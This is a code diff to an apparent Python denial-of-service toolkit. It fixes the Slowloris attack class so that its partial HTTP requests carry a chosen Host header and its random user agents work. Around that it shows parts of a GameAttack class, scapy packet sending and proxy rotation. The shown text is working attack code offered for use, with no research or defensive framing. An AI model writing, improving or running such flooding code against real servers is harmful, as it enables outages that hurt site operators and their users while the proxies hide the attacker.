@@ -1,6 +1,7 @@
 import threading
 import time
 import socket
+import random
 from scapy.all import IP, UDP, TCP, send
 from config import CONFIG, logger
 from utils.proxy import get_random_proxy
@@ -122,8 +123,9 @@ class GameAttack(Layer4Attack):
             t.join()
 
 class SlowLorisAttack(Layer4Attack):
-    def __init__(self, target_ip, port, duration, attack_type, num_sockets=300):
+    def __init__(self, target_ip, port, duration, attack_type, target_host=None, num_sockets=300):
         super().__init__(target_ip, port, duration, attack_type)
+        self.target_host = target_host if target_host else target_ip
         self.num_sockets = num_sockets
         self.sockets = []
         self.user_agents = [
@@ -180,7 +182,7 @@ class SlowLorisAttack(Layer4Attack):
             # Отправляем частичные заголовки
             user_agent = random.choice(self.user_agents)
             s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
-            s.send(f"Host: {self.target_ip}\r\n".encode("utf-8"))
+            s.send(f"Host: {self.target_host}\r\n".encode("utf-8"))
             s.send(f"User-Agent: {user_agent}\r\n".encode("utf-8"))
             s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
             
